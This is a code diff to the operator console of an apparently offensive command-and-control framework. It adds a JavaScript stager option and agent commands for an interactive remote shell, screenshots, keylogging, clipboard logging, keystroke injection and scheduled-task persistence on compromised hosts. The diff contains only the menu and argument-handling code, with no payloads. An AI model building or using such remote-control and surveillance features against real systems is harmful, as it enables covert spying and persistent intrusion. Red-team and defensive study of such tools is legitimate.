@@ -177,22 +177,22 @@ class MainMenu(cmd.Cmd):
 
 	#------------------------------------------------------------------------------------
 	def do_genStager(self, args):
-		"""genStager <oneliner|batch|macro|msbuild|lnk|ducky> <stage name>\nGenerates a stager of the selected type using a specific stage name"""
+		"""genStager <oneliner|batch|macro|msbuild|javascript|ducky> <stage name>\nGenerates a stager of the selected type using a specific stage name"""
 
 		# Checking args
 		if not args:
-			print helpers.color("[!] Missing arguments. Command format: genStager <oneliner|batch|macro|msbuild|lnk|ducky> <stage name>")
+			print helpers.color("[!] Missing arguments. Command format: genStager <oneliner|batch|macro|msbuild|javascript|ducky> <stage name>")
 			return
 
 		arguments = args.split()
 		if len(arguments) < 2:
-			print helpers.color("[!] Missing arguments. Command format: genStager <oneliner|batch|macro|msbuild|ducky> <stage name>")
+			print helpers.color("[!] Missing arguments. Command format: genStager <oneliner|batch|macro|msbuild|javascript|ducky> <stage name>")
 			return
 
 		stagerType = arguments[0]
 		stageName = arguments[1]
 
-		if stagerType not in ['oneliner', 'batch', 'macro', 'msbuild', 'ducky']:
+		if stagerType not in ['oneliner', 'batch', 'macro', 'msbuild', 'javascript', 'ducky']:
 			print helpers.color("[!] Invalid stager type")
 			return
 
@@ -206,7 +206,7 @@ class MainMenu(cmd.Cmd):
 	def complete_genStager(self, text, line, startidx, endidx):
 		result = []
 		if startidx < 15:
-			for stagerType in ['oneliner', 'batch', 'macro', 'msbuild', 'ducky']:
+			for stagerType in ['oneliner', 'batch', 'macro', 'msbuild', 'javascript', 'ducky']:
 				if stagerType.startswith(text):
 					result.append(stagerType)	
 		else:
@@ -305,6 +305,32 @@ class AgentMenu(cmd.Cmd):
 		userCmd = raw_input("CMD> ")
 		if userCmd:
 			self.agentHandler.taskAgentWithCLI(userCmd)
+
+	#------------------------------------------------------------------------------------
+	def do_shell(self, args):
+		"""Switches to an interactive shell on the agent side. The shell process is not killed until you 'exit' it"""
+		
+		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
+			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
+			return
+
+				# Shorten the polling period for a more interactive and fast experience
+		self.statusHandler.pollingPeriod = 2
+		print helpers.color("[*] Temporarily change polling period to 2 seconds for a faster interaction")
+		print helpers.color("[*] Entering interactive shell. Environment is persistent between commands and child process is not killed until you exit it")
+
+		userCmd = ""
+		while userCmd != "exit":	
+			userCmd = raw_input("Shell> ")
+			if userCmd:
+				if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
+					print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
+				else:
+					self.agentHandler.taskAgentWithShell(userCmd)
+
+		# Restore the default polling period
+		print helpers.color("[*] Restoring default polling period")
+		self.statusHandler.pollingPeriod = cfg.defaultPollingPeriod
 	
 	#------------------------------------------------------------------------------------
 	def do_launchProcess(self, args):
@@ -465,6 +491,88 @@ class AgentMenu(cmd.Cmd):
 		self.agentHandler.taskAgentWithGetFile(filePath)
 
 	#------------------------------------------------------------------------------------
+	def do_screenshot(self, args):
+		"""screenshot\nTake a screenshot of the agent screen, in JPG format, and download it"""
+		
+		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
+			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
+			return
+
+		self.agentHandler.taskAgentWithScreenshot()
+
+	#------------------------------------------------------------------------------------
+	def do_keylogger(self, args):
+		"""keylogger <start|stop>\nStart or stops a keylogger"""
+		
+		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
+			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
+			return
+			
+		# Checking args
+		if not args:
+			print helpers.color("[!] Missing arguments. Command format: keylogger <start|stop>")
+			return
+			
+		# Retrieve arguments
+		if args not in ['start', 'stop']:
+			print helpers.color("[!] Invalid arguments. Command format: keylogger <start|stop>")
+			return	
+		
+		self.agentHandler.taskAgentWithKeylogger(args)
+
+	#------------------------------------------------------------------------------------
+	def complete_keylogger(self, text, line, startidx, endidx):
+		return [a for a in ['start', 'stop'] if a.startswith(text)]
+
+	#------------------------------------------------------------------------------------
+	def do_clipboardLogger(self, args):
+		"""clipboardLogger <start|stop>\nStart or stops a clipboard logger"""
+		
+		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
+			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
+			return
+			
+		# Checking args
+		if not args:
+			print helpers.color("[!] Missing arguments. Command format: clipboardLogger <start|stop>")
+			return
+			
+		# Retrieve arguments
+		if args not in ['start', 'stop']:
+			print helpers.color("[!] Invalid arguments. Command format: keylogger <start|stop>")
+			return	
+		
+		self.agentHandler.taskAgentWithClipboardLogger(args)
+
+	#------------------------------------------------------------------------------------
+	def complete_clipboardLogger(self, text, line, startidx, endidx):
+		return [a for a in ['start', 'stop'] if a.startswith(text)]
+
+	#------------------------------------------------------------------------------------
+	def do_sendKeystrokes(self, args):
+		"""sendKeystrokes <process_name> <keys>\nSend specified key strokes to the process identified by its name.\nRef: https://msdn.microsoft.com/en-us/library/aa266279(v=vs.60).aspx"""
+		
+		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
+			print helpers.color("[!] Agent can't be tasked (either because it's DEAD or already tasked with something)")
+			return
+		
+		# Checking args
+		if not args:
+			print helpers.color("[!] Missing arguments. Command format: sendKeystrokes <process_name> <keys>")
+			return
+		
+		arguments = args.split()
+
+		if len(arguments) < 2:
+			print helpers.color("[!] Missing arguments. Command format: sendKeystrokes <process_name> <keys>")
+			return
+		
+		procName = arguments[0]
+		keyStrokes = arguments[1]
+
+		self.agentHandler.taskAgentWithSendKeystrokes(procName, keyStrokes)
+
+	#------------------------------------------------------------------------------------
 	def do_stop(self, args):
 		"""stop\nStop the current agent"""
 		
@@ -475,6 +583,33 @@ class AgentMenu(cmd.Cmd):
 		confirmation = raw_input(helpers.color("[!] Ask remote agent to stop itself? Are you sure? (y/N) "))
 		if confirmation.lower() == 'y':
 			self.agentHandler.taskAgentWithStop()
+
+	#------------------------------------------------------------------------------------
+	def do_persist(self, args):
+		"""persist <stageName>\nEnable agent persistency of a specified stage by the means of a scheduled task"""
+
+		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
+			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
+			return
+
+		# Checking args
+		if not args:
+			print helpers.color("[!] Missing arguments. Command format: persist <stageName>")
+			return
+
+		stageName = args.split()[0]
+
+		if not self.statusHandler.isValidStage(stageName):
+			print helpers.color("[!] Invalid stage: wrong name or no shared URL found")
+			return
+
+		confirmation = raw_input(helpers.color("[!] Set agent persistency? Are you sure? (y/N) "))
+		if confirmation.lower() == 'y':
+			self.agentHandler.taskAgentWithPersist(stageName)
+
+	#------------------------------------------------------------------------------------
+	def complete_persist(self, text, line, startidx, endidx):
+		return [a for a in self.statusHandler.publishedStageList if a.startswith(text)]
 
 	#------------------------------------------------------------------------------------
 	def do_exit(self, args):
